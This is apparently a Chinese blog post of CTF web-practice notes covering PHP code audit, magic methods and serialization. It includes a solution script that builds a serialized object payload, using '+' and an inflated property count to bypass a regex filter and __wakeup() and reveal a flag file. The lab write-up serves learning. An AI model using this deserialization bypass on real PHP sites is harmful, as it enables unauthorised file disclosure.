---
title: ctf-web练习(php)
date: 2023-09-18 00:30:52
tags:
categories:
  - [ctf-web]
  - 渗透
---
# ctf-web练习(php)--待补充

## 代码审计基础知识

代码检查是审计工作中最常用的技术手段，实际应用中，采用“自动分析+人工验证”的方式进行。通常检查项目包括:系统所用开源框架、源代码设计、错误处理不当、直接对象引用、资源滥用、API滥用、后门代码发现等，通常能够识别如下代码中的风险点：

跨站脚本漏洞、跨站请求伪装漏洞、SQL注入漏洞、命令执行漏洞、日志伪造漏洞、参数篡改、密码明文存储、配置文件缺陷、路径操作错误、资源管理、不安全的Ajax调用、系统信息泄露、调试程序残留、第三方控件漏洞、文件上传漏洞、远程命令执行、远程代码执行、越权下载、授权绕过漏洞。

![image-20230914165928110](https://s2.loli.net/2023/09/14/gY5Goj1kVz3eQ9b.png)

## php知识

### php的魔术方法

- __construct() 当一个对象创建时被调用 --构造函数
- __destruct() 当一个对象销毁时被调用 --析构函数
- __wakeup() 使用unserialize时触发
- __sleep() 使用serialize时触发
- __toString()  当一个对象被当做一个字符串时来使用

### php的变量类型

public：属性被序列化的时候属性值会变成 `属性名`

protected：属性被序列化的时候属性值会变成 `\x00*\x00属性名`

private：属性被序列化的时候属性值会变成 `\x00类名\x00属性名`

```php
<?php
class People{
    public $id;
    protected $gender;
    private $age;
    public function __construct(){
        $this->id = 'Hardworking666';
        $this->gender = 'male';
        $this->age = '18';
    }
}
$a = new People();
echo serialize($a);
?>
//O:6:"People":3:{s:2:"id";s:14:"Hardworking666";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"18";}

```

注意：比如，$file 是私有成员，序列化之后字符串首尾会多出两个空格 “%00*%00”，如果有时候利用html网页复制值可能会出现问题。

### php序列化和反序列化

PHP序列化：serialize()

序列化是将变量或对象转换成字符串的过程，用于存储或传递 PHP 的值的过程中，同时不丢失其类型和结构。

而PHP反序列化：unserialize()

反序列化是将字符串转换成变量或对象的过程。

从序列化到反序列化这几个函数的执行过程是：

```php
__construct()` ->`__sleep()` -> `__wakeup()` -> `__toString()` -> `__destruct()
```

```php
<?php  
class TEST{  
 public $test1="11";  
 private $test2="22";  
 protected $test3="33";  
 public function test4()  
 {  
 echo $this->test1;  
 }  
}  
$a=new TEST();  
echo serialize($a); 
?>
//O:4:"TEST":3:{s:5:"test1";s:2:"11";s:11:"TESTtest2";s:2:"22";s:8:"*test3";s:2:"33";}
//O代表类，然后后面4代表类名长度，接着双引号内是类名
//然后是类中变量的个数：{类型：长度:"值"；类型:长度:"值"...以此类推}
//有时候为了避免private和protected导致一些字符不可打印，通常会urlencode一下

```

学习链接：

https://zhuanlan.zhihu.com/p/601673949

## 题目

### 1. ctf-web-“PHP2” 

- phps文件就是php的**源代码文件**，通常用于提供给用户（访问者）查看php代码，因为用户无法直接通过Web浏览器看到php文件的内容，所以需要用**phps**文件代替。其实，只要不用php等已经在服务器中注册过的MIME类型为文件即可，但为了国际通用，所以才用了phps文件类型。

- 运用后台扫描工具

  

### 2. ctf-web-unserialize3

##### **原理**

PHP**反序列化漏洞**：执行unserialize()时，先会调用__wakeup()。

当序列化字符串中属性值个数大于属性个数，就会导致反序列化异常，从而跳过__wakeup()。

（**影响版本**php5<5.6.25,php7<7.010）已经测试过，在本机php8.2中，并不会有该漏洞的出现。

##### **目的**

了解绕过常见的**函数过滤**机制

### 3.Web_php_unserialize

类似于上题，只是多了一个正则过滤问题

![image-20230925181847920](https://s2.loli.net/2023/09/25/vbW31rf7uKmqcSk.png)

```php
<?php 
class Demo { 
    private $file = 'index.php';
    public function __construct($file) { 
        $this->file = $file; 
    }
    function __destruct() { 
        echo @highlight_file($this->file, true); 
    }
    function __wakeup() { 
        if ($this->file != 'index.php') { 
            //the secret is in the fl4g.php
            $this->file = 'index.php'; 
        } 
    } 
}

    $A = new Demo('fl4g.php');
    $C = serialize($A);
    //string(49) "O:4:"Demo":1:{s:10:"Demofile";s:8:"fl4g.php";}"
    $C = str_replace('O:4', 'O:+4',$C);//绕过preg_match
    $C = str_replace(':1:', ':2:',$C);//绕过wakeup

    var_dump(base64_encode($C));
   

    
?>
```

曾出现的问题：

$file 是私有成员序列化之后字符串首尾会多出两个空格 “%00*%00”，所以base64加密最好在代码中执行防止复制漏掉----本人刚开始的解题思路便是启动服务器输出序列化后的字符串然后进行复制，再在代码中进入下一步操作，然后出现了问题。

#### 参考链接

https://blog.csdn.net/Hardworking666/article/details/122373938

https://www.cnblogs.com/hugboy/p/web_php_unserialize.html

